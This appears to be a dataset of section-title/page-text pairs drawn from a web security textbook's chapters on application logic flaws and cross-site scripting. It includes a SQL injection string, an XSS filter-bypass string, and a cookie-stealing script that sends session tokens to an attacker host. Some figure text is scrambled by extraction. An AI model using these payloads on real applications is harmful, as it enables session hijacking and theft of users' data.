‘aaaaaaaa[...]aaaaaaaaaaa’’ and\npassword = ‘or 1=1--’\nThe doubled quotation mark at the end of the string of a’s is interpreted\nas an escaped quotation mark and, therefore, as part of the query data. This\nstring effectively continues as far as the next single quotation mark, which\nin the original query marked the start of the user-supplied password value.\nThus, the actual username that the database understands is the literal string\ndata shown here:\naaaaaaaa[...]aaaaaaaaaaa’and password =\nHence, whatever comes next is interpreted as part of the query itself and can\nbe crafted to interfere with the query logic.\ncc1111..iinndddd 442211 88//1199//22001111 1122::1111::4455 PPMM"
  },
  {
    "input": "Example 10: Abusing a Search Function",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 422\n422 Chapter 11 n Attacking Application Logic\nTIP You can test for this type of vulnerability without knowing exactly what\nlength limit is being imposed by submitting in turn two long strings of the fol-\nlowing form:\n‘’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’and so on\na’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’and so on\nand determining whether an error occurs. Any truncation of escaped input will\noccur after either an even or odd number of characters. Whichever possibility\nis the case, one of the preceding strings will result in an odd number of single\nquotation marks being inserted into the query, resulting in invalid syntax.\nHACK STEPS\nMake a note of any instances in which the application modifi es user input, in\nparticular by truncating it, stripping out data, encoding, or decoding. For any\nobserved instances, determine whether a malicious string can be contrived:\n1. If data is stripped once (nonrecursively), determine whether you can\nsubmit a string that compensates for this. For example, if the application\nfilters SQL keywords such as SELECT, submit SELSELECTECT and see if\nthe resulting filtering removes the inner SELECT substring, leaving the\nwordSELECT.\n2. If data validation takes place in a set order and one or more validation\nprocesses modifies the data, determine whether this can be used to beat\none of the prior validation steps. For example, if the application performs\nURL decoding and then strips malicious data such as the <script> tag, it\nmay be possible to overcome this with strings such as:\n%<script>3cscript%<script>3ealert(1)%<script>3c/\nscript%<script>3e\nNOTE Cross-site scripting fi lters frequently inadvisably strip all data that\noccurs between HTML tag pairs, such as <tag1>aaaaa</tag1>. These are\noften vulnerable to this type of attack.\nExample 10: Abusing a Search Function\nThe authors encountered this logic fl aw in an application providing subscription-\nbased access to fi nancial news and information. The same vulnerability was\nlater found in two completely unrelated applications, illustrating the subtle and\npervasive nature of many logic fl aws.\ncc1111..iinndddd 442222 88//1199//22001111 1122::1111::4455 PPMM\n22 Stuttard c11.indd V2 - 07/26/2011 Page 423\nChapter 11 n Attacking Application Logic 423\nThe Functionality\nThe application provided access to a huge archive of historical and current\ninformation, including company reports and accounts, press releases, market\nanalyses, and the like. Most of this information was accessible only to paying\nsubscribers.\nThe application provided a powerful and fi ne-grained search function that\nall users could access. When an anonymous user performed a query, the search\nfunction returned links to all documents that matched the query. However, the\nuser was required to subscribe to retrieve any of the actual protected documents\nhis query returned. The application’s owners regarded this behavior as a useful\nmarketing tactic.\nThe Assumption\nThe application’s designer assumed that users could not use the search function\nto extract any useful information without paying for it. The document titles\nlisted in the search results were typically cryptic, such as “Annual Results 2010,”\n“Press Release 08-03-2011,” and so on.\nThe Attack\nBecause the search function indicated how many documents matched a given\nquery, a wily user could issue a large number of queries and use inference to\nextract information from the search function that normally would need to be\npaid for. For example, the following queries could be used to zero in on the\ncontents of an individual protected document:\nwahh consulting\n>> 276 matches\nwahh consulting “Press Release 08-03-2011” merger\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” share issue\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” dividend\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover\n>> 1 match\nwahh consulting “Press Release 08-03-2011” takeover haxors inc\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover uberleet ltd\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover script kiddy corp\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover ngs\n>> 1 match\ncc1111..iinndddd 442233 88//1199//22001111 1122::1111::4466 PPMM"
  },
  {
    "input": "Example 11: Snarfing Debug Messages",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 424\n424 Chapter 11 n Attacking Application Logic\nwahh consulting “Press Release 08-03-2011” takeover ngs announced\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover ngs cancelled\n>> 0 matches\nwahh consulting “Press Release 08-03-2011” takeover ngs completed\n>> 1 match\nAlthough the user cannot view the document itself, with suffi cient imagi-\nnation and use of scripted requests, he may be able to build a fairly accurate\nunderstanding of its contents.\nTIP In certain situations, being able to leach information via a search\nfunction in this way may be critical to the security of the application itself,\neffectively disclosing details of administrative functions, passwords, and tech-\nnologies in use.\nTIP This technique has proven to be an effective attack against internal\ndocument mana gement software. The authors have used this technique to\nbrute-force a key password from a confi guration fi le that was stored in a wiki.\nBecause the wiki returned a hit if the search string appeared anywhere in the\npage (instead of matching on whole words), it was possible to brute-force the\npassword letter by letter, searching for the following:\nPassword=A\nPassword=B\nPassword=BA\n...\nExample 11: Snarfi ng Debug Messages\nThe authors encountered this logic fl aw in a web application used by a fi nancial\nservices company.\nThe Functionality\nThe application was only recently deployed. Like much new software, it still con-\ntained a number of functionality-related bugs. Intermittently, various operations\nwould fail in an unpredictable way, and users would receive an error message.\nTo facilitate the investigation of errors, developers decided to include detailed,\nverbose information in these messages, including the following details:\nn The user’s identity\nn The token for the current session\nn The URL being accessed\nn All the parameters supplied with the request that generated the error\ncc1111..iinndddd 442244 88//1199//22001111 1122::1111::4466 PPMM\n24 Stuttard c11.indd V2 - 07/26/2011 Page 425\nChapter 11 n Attacking Application Logic 425\nGenerating these messages had proven useful when help desk personnel\nattempted to investigate and recover from system failures. They also were help-\ning iron out the remaining functionality bugs.\nThe Assumption\nDespite the usual warnings from security advisers that verbose debug messages\nof this kind could potentially be misused by an attacker, the developers reasoned\nthat they were not opening any security vulnerability. The user could readily\nobtain all the information contained in the debugging message by inspecting\nthe requests and responses processed by her browser. The messages did not\ninclude any details about the actual failure, such as stack traces, so conceivably\nthey were not helpful in formulating an attack against the application.\nThe Attack\nDespite their reasoning about the contents of the debug messages, the develop-\ners’ assumption was fl awed because of mistakes they made in implementing\nthe creation of debugging messages.\nWhen an error occurred, a component of the application gathered all the\nrequired information and stored it. The user was issued an HTTP redirect to a\nURL that displayed this stored information. The problem was that the applica-\ntion’s storage of debug information, and user access to the error message, was\nnot session-based. Rather, the debugging information was stored in a static\ncontainer, and the error message URL always displayed the information that was\nlast placed in this container. Developers had assumed that users following the\nredirect would therefore see only the debug information relating to their error.\nIn fact, in this situation, ordinary users would occasionally be presented with\nthe debugging information relating to a different user’s error, because the two\nerrors had occurred almost simultaneously. But aside from questions about\nthread safety (see the next example), this was not simply a race condition. An\nattacker who discovered how the error mechanism functioned could simply\npoll the message URL repeatedly and log the results each time they changed.\nOver a period of few hours, this log would contain sensitive data about numer-\nous application users:\nn A set of usernames that could be used in a password-guessing attack\nn A set of session tokens that could be used to hijack sessions\nn A set of user-supplied input, which may contain passwords and other\nsensitive items\nThe error mechanism, therefore, presented a critical security threat. Because\nadministrative users sometimes received these detailed error messages, an\ncc1111..iinndddd 442255 88//1199//22001111 1122::1111::4466 PPMM"
  },
  {
    "input": "Example 12: Racing Against the Login",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 426\n426 Chapter 11 n Attacking Application Logic\nattacker monitoring error messages would soon obtain suffi cient information\nto compromise the entire application.\nHACK STEPS\n1. To detect a flaw of this kind, first catalog all the anomalous events and\nconditions that can be generated and that involve interesting user-specific\ninformation being returned to the browser in an unusual way, such as a\ndebugging error message.\n2. Using the application as two users in parallel, systematically engineer\neach condition using one or both users, and determine whether the other\nuser is affected in each case.\nExample 12: Racing Against the Login\nThis logic fl aw has affected several major applications in the recent past.\nThe Functionality\nThe application implemented a robust, multistage login process in which users\nwere required to supply several different credentials to gain access.\nThe Assumption\nThe authentication mechanism had been subject to numerous design reviews\nand penetration tests. The owners were confi dent that no feasible means existed\nof attacking the mechanism to gain unauthorized access.\nThe Attack\nIn fact, the authentication mechanism contained a subtle fl aw. Occasionally,\nwhen a customer logged in, he gained access to the account of a completely\ndifferent user, enabling him to view all that user’s fi nancial details, and even\nmake payments from the other user’s account. The application’s behavior ini-\ntially appeared to be random: the user had not performed any unusual action to\ngain unauthorized access, and the anomaly did not recur on subsequent logins.\nAfter some investigation, the bank discovered that the error was occurring when\ntwo different users logged in to the application at precisely the same moment. It\ndid not occur on every such occasion—only on a subset of them. The root cause\nwas that the application was briefl y storing a key identifi er about each newly\nauthenticated user within a static (nonsession) variable. After being written, this\nvariable’s value was read back an instant later. If a different thread (processing\nanother login) had written to the variable during this instant, the earlier user\nwould land in an authenticated session belonging to the subsequent user.\ncc1111..iinndddd 442266 88//1199//22001111 1122::1111::4466 PPMM\n26 Stuttard c11.indd V2 - 07/26/2011 Page 427\nChapter 11 n Attacking Application Logic 427\nThe vulnerability arose from the same kind of mistake as in the error message\nexample described previously: the application was using static storage to hold\ninformation that should have been stored on a per-thread or per-session basis.\nHowever, the present example is far more subtle to detect and is more diffi cult\nto exploit because it cannot be reliably reproduced.\nFlaws of this kind are known as “race conditions” because they involve a\nvulnerability that arises for a brief period of time under certain specifi c circum-\nstances. Because the vulnerability exists only for a short time, an attacker “races”\nto exploit it before the application closes it again. In cases where the attacker is\nlocal to the application, it is often possible to engineer the exact circumstances\nunder which the race condition arises and reliably exploit the vulnerability\nduring the available window. Where the attacker is remote to the application,\nthis is normally much harder to achieve.\nA remote attacker who understood the nature of the vulnerability could\nconceivably have devised an attack to exploit it by using a script to log in con-\ntinuously and check the details of the account accessed. But the tiny window\nduring which the vulnerability could be exploited meant that a huge number\nof requests would be required.\nIt was not surprising that the race condition was not discovered during normal\npenetration testing. The conditions in which it arose came about only when the\napplication gained a large-enough user base for random anomalies to occur, which\nwere reported by customers. However, a close code review of the authentication\nand session management logic would have identifi ed the problem.\nHACK STEPS\nPerforming remote black-box testing for subtle thread safety issues of this\nkind is not straightforward. It should be regarded as a specialized undertak-\ning, probably necessary only in the most security-critical of applications.\n1. Target selected items of key functionality, such as login mechanisms,\npassword change functions, and funds transfer processes.\n2. For each function tested, identify a single request, or a small number\nof requests, that a given user can use to perform a single action. Also\nfind the simplest means of confirming the result of the action, such as\nverifying that a given user’s login has resulted in access to that person’s\naccount information.\n3. Using several high-spec machines, accessing the application from differ-\nent network locations, script an attack to perform the same action repeat-\nedly on behalf of several different users. Confirm whether each action has\nthe expected result.\n4. Be prepared for a large volume of false positives. Depending on the\nscale of the application’s supporting infrastructure, this activity may well\namount to a load test of the installation. Anomalies may be experienced\nfor reasons that have nothing to do with security.\ncc1111..iinndddd 442277 88//1199//22001111 1122::1111::4466 PPMM"
  },
  {
    "input": "Avoiding Logic Flaws",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 428\n428 Chapter 11 n Attacking Application Logic\nAvoiding Logic Flaws\nJust as there is no unique signature by which logic fl aws in web applications\ncan be identifi ed, there is also no silver bullet that will protect you. For example,\nthere is no equivalent to the straightforward advice of using a safe alternative\nto a dangerous API. Nevertheless, a range of good practices can be applied to\nsignifi cantly reduce the risk of logical fl aws appearing within your applications:\nn Ensure that every aspect of the application’s design is clearly documented\nin suffi cient detail for an outsider to understand every assumption the\ndesigner made. All such assumptions should be explicitly recorded within\nthe design documentation.\nn Mandate that all source code is clearly commented to include the follow-\ning information throughout:\nn The purpose and intended uses of each code component.\nn The assumptions made by each component about anything that is\noutside of its direct control.\nn References to all client code that uses the component. Clear documenta-\ntion to this effect could have prevented the logic fl aw within the online\nregistration functionality. (Note that “client” here refers not to the user\nend of the client/server relationship but to other code for which the\ncomponent being considered is an immediate dependency.)\nn During security-focused reviews of the application design, refl ect on every\nassumption made within the design, and try to imagine circumstances\nunder which each assumption might be violated. Focus on any assumed\nconditions that could conceivably be within the control of application users.\nn During security-focused code reviews, think laterally about two key areas:\nthe ways in which the application will handle unexpected user behavior,\nand the potential side effects of any dependencies and interoperation\nbetween different code components and different application functions.\nIn relation to the specifi c examples of logic fl aws we have described, a number\nof individual lessons can be learned:\nn Be constantly aware that users control every aspect of every request (see\nChapter 1). They may access multistage functions in any sequence. They\nmay submit parameters that the application did not ask for. They may\nomit certain parameters, not just interfere with the parameters’ values.\nn Drive all decisions regarding a user’s identity and status from her session (see\nChapter 8). Do not make any assumptions about the user’s privileges on the\nbasis of any other feature of the request, including the fact that it occurs at all.\ncc1111..iinndddd 442288 88//1199//22001111 1122::1111::4466 PPMM"
  },
  {
    "input": "Summary",
    "output": "28 Stuttard c11.indd V2 - 07/26/2011 Page 429\nChapter 11 n Attacking Application Logic 429\nn When implementing functions that update session data on the basis of\ninput received from the user, or actions performed by the user, carefully\nconsider any impact that the updated data may have on other functionality\nwithin the application. Be aware that unexpected side effects may occur\nin entirely unrelated functionality written by a different programmer or\neven a different development team.\nn If a search function is liable to index sensitive data that some users are\nnot authorized to access, ensure that the function does not provide any\nmeans for those users to infer information based on search results. If\nappropriate, maintain several search indexes based on different levels of\nuser privilege, or perform dynamic searches of information repositories\nwith the privileges of the requesting user.\nn Be extremely wary of implementing any functionality that enables any\nuser to delete items from an audit trail. Also, consider the possible impact\nof a high-privileged user creating another user of the same privilege level\nin heavily audited applications and dual-authorization models.\nn When carrying out checks based on numeric business limits and thresh-\nolds, perform strict canonicalization and data validation on all user input\nbefore processing it. If negative numbers are not expected, explicitly reject\nrequests that contain them.\nn When implementing discounts based on order volumes, ensure that orders\nare fi nalized before actually applying the discount.\nn When escaping user-supplied data before passing to a potentially vulner-\nable application component, always be sure to escape the escape character\nitself, or the entire validation mechanism may be broken.\nn Always use appropriate storage to maintain any data that relates to an\nindividual user—either in the session or in the user’s profi le.\nSummary\nAttacking an application’s logic involves a mixture of systematic probing and\nlateral thinking. We have described various key checks that you should always\ncarry out to test the application’s behavior in response to unexpected input.\nThese include removing parameters from requests, using forced browsing to\naccess functions out of sequence, and submitting parameters to different loca-\ntions within the application. Often, how an application responds to these actions\npoints toward some defective assumption that you can violate, to malicious effect.\nIn addition to these basic tests, the most important challenge when probing\nfor logic fl aws is to try to get inside the developers’ minds. You need to under-\nstand what they were trying to achieve, what assumptions they probably made,\ncc1111..iinndddd 442299 88//1199//22001111 1122::1111::4466 PPMM"
  },
  {
    "input": "Questions",
    "output": "Stuttard c11.indd V2 - 07/26/2011 Page 430\n430 Chapter 11 n Attacking Application Logic\nwhat shortcuts they probably took, and what mistakes they may have made.\nImagine that you were working on a tight deadline, worrying primarily about\nfunctionality rather than security, trying to add a new function to an existing\ncode base, or using poorly documented APIs written by someone else. In that\nsituation, what would you get wrong, and how could it be exploited?\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. What is forced browsing, and what kinds of vulnerabilities can it be used\nto identify?\n2. An application applies various global fi lters on user input, designed to\nprevent different categories of attack. To defend against SQL injection,\nit doubles up any single quotation marks that appear in user input. To\nprevent buffer overfl ow attacks against some native code components, it\ntruncates any overlong items to a reasonable limit.\nWhat might go wrong with these fi lters?\n3. What steps could you take to probe a login function for fail-open condi-\ntions? (Describe as many different tests as you can think of.)\n4. A banking application implements a multistage login mechanism that is\nintended to be highly robust. At the fi rst stage, the user enters a username\nand password. At the second stage, the user enters the changing value on\na physical token she possesses, and the original username is resubmitted\nin a hidden form fi eld.\nWhat logic fl aw should you immediately check for?\n5. You are probing an application for common categories of vulnerability\nby submitting crafted input. Frequently, the application returns verbose\nerror messages containing debugging information. Occasionally, these\nmessages relate to errors generated by other users. When this happens,\nyou are unable to reproduce the behavior a second time. What logic fl aw\nmight this indicate, and how should you proceed?\ncc1111..iinndddd 443300 88//1199//22001111 1122::1111::4466 PPMM"
  },
  {
    "input": "Chapter 12 Attacking Users: Cross-Site Scripting",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 431\nCHAPTER\n12\nAttacking Users:\nCross-Site Scripting\nAll the attacks we have considered so far involve directly targeting the server-\nside application. Many of these attacks do, of course, impinge upon other users,\nsuch as a SQL injection attack that steals other users’ data. But the attacker’s\nessential methodology was to interact with the server in unexpected ways to\nperform unauthorized actions and access unauthorized data.\nThe attacks described in this chapter and the next are in a different category,\nbecause the attacker’s primary target is the application’s other users. All the\nrelevant vulnerabilities still exist within the application itself. However, the\nattacker leverages some aspect of the application’s behavior to carry out malicious\nactions against another end user. These actions may result in some of the same\neffects that we have already examined, such as session hijacking, unauthor-\nized actions, and the disclosure of personal data. They may also result in other\nundesirable outcomes, such as logging of keystrokes or execution of arbitrary\ncommands on users’ computers.\nOther areas of software security have witnessed a gradual shift in focus from\nserver-side to client-side attacks in recent years. For example, Microsoft used\nto frequently announce serious security vulnerabilities within its server prod-\nucts. Although numerous client-side fl aws were also disclosed, these received\nmuch less attention because servers presented a much more appealing target\nfor most attackers. In the course of just a few years, at the start of the twenty-\nfi rst century, this situation has changed markedly. At the time of this writing,\n431\ncc1122..iinndddd 443311 88//1199//22001111 1122::1122::2255 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 432\n432 Chapter 12 n Attacking Users: Cross-Site Scripting\nno critical security vulnerabilities have been publicly announced in Microsoft’s\nIIS web server from version 6 onward. However, in the time since this product\nwas fi rst released, a large number of fl aws have been disclosed in Microsoft’s\nInternet Explorer browser. As general awareness of security threats has evolved,\nthe front line of the battle between application owners and hackers has moved\nfrom the server to the client.\nAlthough the development of web application security has been a few years\nbehind the curve, the same trend can be identifi ed. At the end of the 1990s, most\napplications on the Internet were riddled with critical fl aws such as command\ninjection, which could be easily found and exploited by any attacker with a bit\nof knowledge. Although many such vulnerabilities still exist today, they are\nslowly becoming less widespread and more diffi cult to exploit. Meanwhile, even\nthe most security-critical applications still contain many easily discoverable\nclient-side fl aws. Furthermore, although the server side of an application may\nbehave in a limited, controllable manner, clients may use any number of dif-\nferent browser technologies and versions, opening a wide range of potentially\nsuccessful attack vectors.\nA key focus of research in the past decade has been client-side vulnerabilities,\nwith defects such as session fi xation and cross-site request forgery fi rst being\ndiscussed many years after most categories of server-side bugs were widely\nknown. Media focus on web security is predominantly concerned with client-\nside attacks, with such terms as spyware, phishing, and Trojans being common\ncurrency to many journalists who have never heard of SQL injection or path\ntraversal. And attacks against web application users are an increasingly lucra-\ntive criminal business. Why go to the trouble of breaking into an Internet bank\nwhen you can instead compromise 1% of its 10 million customers in a relatively\ncrude attack that requires little skill or elegance?\nAttacks against other application users come in many forms and manifest a\nvariety of subtleties and nuances that are frequently overlooked. They are also\nless well understood in general than the primary server-side attacks, with dif-\nferent fl aws being confl ated or neglected even by some seasoned penetration\ntesters. We will describe all the different vulnerabilities that are commonly\nencountered and spell out the practical steps you need to follow to identify and\nexploit each of these.\nThis chapter focuses on cross-site scripting (XSS). This category of vulner-\nability is the Godfather of attacks against other users. It is by some measure the\nmost prevalent web application vulnerability found in the wild. It affl icts the\nvast majority of live applications, including some of the most security-critical\napplications on the Internet, such as those used by online banks. The next\nchapter examines a large number of other types of attacks against users, some\nof which have important similarities to XSS.\ncc1122..iinndddd 443322 88//1199//22001111 1122::1122::2266 PPMM"
  },
  {
    "input": "Varieties of XSS",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 433\nChapter 12 n Attacking Users: Cross-Site Scripting 433\nCOMMON MYTH\n“Users get compromised because they are not security-conscious”.\nAlthough this is partially true, some attacks against application users can\nbe successful regardless of the users’ security precautions. Stored XSS attacks\ncan compromise the most security-conscious users without any interaction\nfrom the user. Chapter 13 introduces many more methods by which security-\nconscious users can be compromised without their knowledge.\nWhen XSS was fi rst becoming widely known in the web application security\ncommunity, some professional penetration testers were inclined to regard XSS\nas a “lame” vulnerability. This was partly due to its phenomenal prevalence\nacross the web, and also because XSS is often of less direct use to a lone hacker\ntargeting an application, as compared with many vulnerabilities such as server-\nside command injection. Over time, this perception has changed, and today XSS\nis often cited as the number-one security threat on the web. As research into\nclient-side attacks has developed, discussion has focused on numerous other\nattacks that are at least as convoluted to exploit as any XSS fl aw. And numerous\nreal-world attacks have occurred in which XSS vulnerabilities have been used\nto compromise high-profi le organizations.\nXSS often represents a critical security weakness within an application. It\ncan often be combined with other vulnerabilities to devastating effect. In some\nsituations, an XSS attack can be turned into a virus or self-propagating worm.\nAttacks of this kind are certainly not lame.\nCOMMON MYTH\n“You can’t own a web application via XSS.”\nThe authors have owned numerous applications using only XSS attacks. In\nthe right situation, a skillfully exploited XSS vulnerability can lead directly to a\ncomplete compromise of the application. We will show you how.\nVarieties of XSS\nXSS vulnerabilities come in various forms and may be divided into three vari-\neties: refl ected, stored, and DOM-based. Although these have several features\nin common, they also have important differences in how they can be identifi ed\nand exploited. We will examine each variety of XSS in turn.\ncc1122..iinndddd 443333 88//1199//22001111 1122::1122::2266 PPMM"
  },
  {
    "input": "Reflected XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 434\n434 Chapter 12 n Attacking Users: Cross-Site Scripting\nRefl ected XSS Vulnerabilities\nA very common example of XSS occurs when an application employs a dynamic\npage to display error messages to users. Typically, the page takes a parameter\ncontaining the message’s text and simply renders this text back to the user within\nits response. This type of mechanism is convenient for developers, because it\nallows them to invoke a customized error page from anywhere in the application\nwithout needing to hard-code individual messages within the error page itself.\nFor example, consider the following URL, which returns the error message\nshown in Figure 12-1:\nhttp://mdsec.net/error/5/Error.ashx?message=Sorry%2c+an+error+occurred\nFigure 12-1: A dynamically generated error message\nLooking at the HTML source for the returned page, we can see that the appli-\ncation simply copies the value of the message parameter in the URL and inserts\nit into the error page template at the appropriate place:\n<p>Sorry, an error occurred.</p>\nThis behavior of taking user-supplied input and inserting it into the HTML\nof the server’s response is one of the signatures of refl ected XSS vulnerabilities,\nand if no fi ltering or sanitization is being performed, the application is certainly\nvulnerable. Let’s see how.\nThe following URL has been crafted to replace the error message with a piece\nof JavaScript that generates a pop-up dialog:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>alert(1)</script>\nRequesting this URL generates an HTML page that contains the following\nin place of the original message:\n<p><script>alert(1);</script></p>\ncc1122..iinndddd 443344 88//1199//22001111 1122::1122::2266 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 435\nChapter 12 n Attacking Users: Cross-Site Scripting 435\nSure enough, when the page is rendered within the user’s browser, the pop-\nup message appears, as shown in Figure 12-2.\nFigure 12-2: A proof-of-concept XSS exploit\nPerforming this simple test serves verifi es two important things. First, the\ncontents of the message parameter can be replaced with arbitrary data that gets\nreturned to the browser. Second, whatever processing the server-side application\nis performing on this data (if any), it is insuffi cient to prevent us from supply-\ning JavaScript code that is executed when the page is displayed in the browser.\nTRY IT!\nhttp://mdsec.net/error/5/\nNOTE If you try examples like this in Internet Explorer, the pop-up may fail to\nappear, and the browser may show the message “Internet Explorer has modi-\nfi ed this page to help prevent cross-site scripting.” This is because recent ver-\nsions of Internet Explorer contain a built-in mechanism designed to protect\nusers against refl ected XSS vulnerabilities. If you want to test these examples,\nyou can try a different browser that does not use this protection, or you can dis-\nÿ ÿ ÿ\nable the XSS fi lter by going to Tools Internet Options Security Custom\nLevel. Under Enable XSS fi lter, select Disable. We will describe how the XSS fi l-\nter works, and ways in which it can be circumvented, later in this chapter.\nThis type of simple XSS bug accounts for approximately 75% of the XSS\nvulnerabilities that exist in real-world web applications. It is called refl ected\nXSS because exploiting the vulnerability involves crafting a request containing\nembedded JavaScript that is refl ected to any user who makes the request. The\nattack payload is delivered and executed via a single request and response. For\nthis reason, it is also sometimes called fi rst-order XSS.\ncc1122..iinndddd 443355 88//1199//22001111 1122::1122::2266 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 436\n436 Chapter 12 n Attacking Users: Cross-Site Scripting\nExploiting the Vulnerability\nAs you will see, XSS vulnerabilities can be exploited in many different ways\nto attack other users of an application. One of the simplest attacks, and the one\nthat is most commonly envisaged to explain the potential signifi cance of XSS\nfl aws, results in the attacker’s capturing the session token of an authenticated\nuser. Hijacking the user’s session gives the attacker access to all the data and\nfunctionality to which the user is authorized (see Chapter 7).\nThe steps involved in this attack are illustrated in Figure 12-3.\nApplication\n3. U 1 s . e U r s r 4 e e . q r S u lo e e g a s r s v t t t s e a i n r a c t k r t e e a s r c ’ p k s o e J n r a ’ d s v s a\nU\nS w\nR\nc i\nL\nt r h ipt\n7.\nA ttacker\nhijacks user’s session\n5. Attacker’s\nJavaScript 2. Attacker feeds crafted URL to user\nexecutes in\n6. User’s browser sends session token to attacker\nuser’s browser\nUser Attacker\nFigure 12-3: The steps involved in a reflected XSS attack\n1. The user logs in to the application as normal and is issued a cookie\ncontaining a session token:\nSet-Cookie: sessId=184a9138ed37374201a4c9672362f12459c2a652491a3\n2. Through some means (described in detail later), the attacker feeds the\nfollowing URL to the user:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>var+i=new+Image\n;+i.src=”http://mdattacker.net/”%2bdocument.cookie;</script>\nAs in the previous example, which generated a dialog message, this URL\ncontains embedded JavaScript. However, the attack payload in this case\nis more malicious.\n3. The user requests from the application the URL fed to him by the attacker.\ncc1122..iinndddd 443366 88//1199//22001111 1122::1122::2266 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 437\nChapter 12 n Attacking Users: Cross-Site Scripting 437\n4. The server responds to the user’s request. As a result of the XSS vulner-\nability, the response contains the JavaScript the attacker created.\n5. The user’s browser receives the attacker’s JavaScript and executes it in the\nsame way it does any other code it receives from the application.\n6. The malicious JavaScript created by the attacker is:\nvar i=new Image; i.src=”http://mdattacker.net/”+document.cookie;\nThis code causes the user’s browser to make a request to mdattacker.net\nwhich is a domain owned by the attacker. The request contains the user’s\ncurrent session token for the application:\nGET /sessId=184a9138ed37374201a4c9672362f12459c2a652491a3 HTTP/1.1\nHost: mdattacker.net\n7. The attacker monitors requests to mdattacker.net and receives the user’s\nrequest. He uses the captured token to hijack the user’s session, gaining\naccess to that user’s personal information and performing arbitrary actions\n“as” the user.\nNOTE As you saw in Chapter 6, some applications store a persistent cookie\nthat effectively reauthenticates the user on each visit, such as to implement a\n“remember me” function. In this situation, step 1 of the preceding process is\nunnecessary. The attack will succeed even when the target user is not actively\nlogged in to or using the application. Because of this, applications that use\ncookies in this way leave themselves more exposed in terms of the impact of\nany XSS fl aws they contain.\nAfter reading all this, you may be forgiven for wondering why, if the attacker\ncan induce the user to visit a URL of his choosing, he bothers with the rigma-\nrole of transmitting his malicious JavaScript via the XSS bug in the vulnerable\napplication. Why doesn’t he simply host a malicious script on mdattacker.net\nand feed the user a direct link to this script? Wouldn’t this script execute in the\nsame way as it does in the example described?\nTo understand why the attacker needs to exploit the XSS vulnerability, recall\nthe same-origin policy that was described in Chapter 3. Browsers segregate\ncontent that is received from different origins (domains) in an attempt to prevent\ndifferent domains from interfering with each other within a user’s browser.\nThe attacker’s objective is not simply to execute an arbitrary script but to cap-\nture the user’s session token. Browsers do not let just any old script access a\ndomain’s cookies; otherwise, session hijacking would be easy. Rather, cookies\ncan be accessed only by the domain that issued them. They are submitted in\nHTTP requests back to the issuing domain only, and they can be accessed via\ncc1122..iinndddd 443377 88//1199//22001111 1122::1122::2266 PPMM"
  },
  {
    "input": "Stored XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 438\n438 Chapter 12 n Attacking Users: Cross-Site Scripting\nJavaScript contained within or loaded by a page returned by that domain only.\nHence, if a script residing on mdattacker.net queries document.cookie, it will\nnot obtain the cookies issued by mdsec.net, and the hijacking attack will fail.\nThe reason why the attack that exploits the XSS vulnerability is successful is\nthat, as far as the user’s browser is concerned, the attacker’s malicious JavaScript\nwas sent to it by mdsec.net. When the user requests the attacker’s URL, the\nbrowser makes a request to http://mdsec.net/error/5/Error.ashx , and the\napplication returns a page containing some JavaScript. As with any JavaScript\nreceived from mdsec.net, the browser executes this script within the security\ncontext of the user’s relationship with mdsec.net. This is why the attacker’s\nscript, although it actually originates elsewhere, can gain access to the cook-\nies issued by mdsec.net. This is also why the vulnerability itself has become\nknown as cross-sitescripting.\nStored XSS Vulnerabilities\nA different category of XSS vulnerability is often called stored cross-site scripting.\nThis version arises when data submitted by one user is stored in the application\n(typically in a back-end database) and then is displayed to other users without\nbeing fi ltered or sanitized appropriately.\nStored XSS vulnerabilities are common in applications that support interac-\ntion between end users, or where administrative staff access user records and\ndata within the same application. For example, consider an auction application\nthat allows buyers to post questions about specifi c items and sellers to post\nresponses. If a user can post a question containing embedded JavaScript, and\nthe application does not fi lter or sanitize this, an attacker can post a crafted\nquestion that causes arbitrary scripts to execute within the browser of anyone\nwho views the question, including both the seller and other potential buyers.\nIn this context, the attacker could potentially cause unwitting users to bid on\nan item without intending to, or cause a seller to close an auction and accept\nthe attacker’s low bid for an item.\nAttacks against stored XSS vulnerabilities typically involve at least two requests\nto the application. In the fi rst, the attacker posts some crafted data containing\nmalicious code that the application stores. In the second, a victim views a page\ncontaining the attacker’s data, and the malicious code is executed when the\nscript is executed in the victim’s browser. For this reason, the vulnerability is\nalso sometimes called second-order cross-site scripting. (In this instance, “XSS”\nis really a misnomer, because the attack has no cross-site element. The name is\nwidely used, however, so we will retain it here.)\nFigure 12-4 illustrates how an attacker can exploit a stored XSS vulnerability\nto perform the same session hijacking attack as was described for refl ected XSS.\ncc1122..iinndddd 443388 88//1199//22001111 1122::1122::2277 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 439\nChapter 12 n Attacking Users: Cross-Site Scripting 439\nApplication\n3. Us 2 e . r U v s i 4 e e . r w S l s o e g a a rv s t t t t e a a i r n c c k r k e e e s r r ’ ’ p s s o q J n a u d v e s a s S w tio c it r n h ipt 7. A tt c a o c n ke ta r 1 i n . h i A i n ja t g t c a k m c s k a e u li r s c e s io r u ’ u b s s m s J e i a t s s v s a q io S u\nn\nc e r s i t p io t n\n5. Attacker’s\nJavaScript\nexecutes in\n6. User’s browser sends session token to attacker\nuser’s browser\nUser Attacker\nFigure 12-4: The steps involved in a stored XSS attack\nTRY 